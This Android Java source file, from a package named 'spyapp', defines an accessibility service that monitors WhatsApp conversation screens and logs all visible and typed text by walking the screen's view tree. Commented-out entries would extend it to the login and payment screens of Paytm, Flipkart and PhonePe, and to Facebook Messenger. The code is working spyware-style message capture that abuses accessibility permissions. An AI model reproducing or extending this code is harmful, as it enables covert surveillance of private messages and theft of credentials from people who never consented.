package kkactive_india.in.spyapp;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ComponentName;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;

public class MyAccessibilityService extends AccessibilityService {
    private static final String LOG_TAG = MyAccessibilityService.class.getSimpleName();
    private ArrayList<String> packages;
    private boolean shouldTrack;

    @Override
    protected void onServiceConnected() {
        AccessibilityServiceInfo info = getServiceInfo();
        populateActivitesTotrack();
        info.packageNames = new String[]
                {
                         "com.whatsapp"
                };
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;

        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        this.setServiceInfo(info);
    }

    private void populateActivitesTotrack() {
        packages = new ArrayList<>();
       // packages.add("net.one97.paytm/.auth.activity.AJRAuthActivity");
       // packages.add("com.flipkart.android/.activity.MLoginActivity");
        packages.add("com.whatsapp/.Conversation");
      //  packages.add("com.facebook.orca/com.facebook.messenger.neue.MainActivity");
      //  packages.add("bpr10.git.voodosample/bpr10.git.voodosample1.MainActivity");
       // packages.add("com.phonepe.app/.ui.activity.Navigator_MainActivity");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) { boolean shouldToast = true;
        if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            ComponentName componentName = new ComponentName(
                    accessibilityEvent.getPackageName().toString(),
                    accessibilityEvent.getClassName().toString()
            );

            shouldToast = false;
            ActivityInfo activityInfo = tryGetActivity(componentName);
            boolean isActivity = activityInfo != null;
            if (isActivity) {
                shouldTrack = isActivityToBeTracked(componentName.flattenToShortString());
            }
        }
        if (!shouldTrack) {
            return;
        }

        final int eventType = accessibilityEvent.getEventType();
        String eventText = null;
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                eventText = " Text Changed ";
            }
        }

        eventText = eventText + " CD: " + accessibilityEvent.getContentDescription() + " ";

       // Log.e("Text",eventText);
       // Log.e("Type", String.valueOf(eventType));

        AccessibilityNodeInfo source = accessibilityEvent.getSource();
        if (source == null) {
            return;
        }

        printAllText(source, shouldToast);

    }
    private boolean isActivityToBeTracked(String activityInfo) {
        return packages.contains(activityInfo);
    }

    private ActivityInfo tryGetActivity(ComponentName componentName) {
        try {
            return getPackageManager().getActivityInfo(componentName, 0);
        } catch (PackageManager.NameNotFoundException e) {
            return null;
        }
    }

    private void printAllText(AccessibilityNodeInfo source, boolean shouldToast) {
        if (source == null) {
            return;
        }
        if (("android.widget.TextView").equals(source.getClassName()) || ("android.widget.EditText")
                .equals(source.getClassName())) {
            String id = source.getViewIdResourceName();
            if (id != null) {
                id = id.split("/")[1];
            }
            String eventData = "id: " + id + ", text:" + source.getText();

            Log.e("EventData", eventData);
           // BusProvider.UI_BUS.post(new TextChangeEvent(eventData, shouldToast));

        }
        for (int i = 0; i < source.getChildCount(); i++) {
            AccessibilityNodeInfo child = source.getChild(i);
            if (child != null) {
                printAllText(child, shouldToast);
                child.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {

    }
}
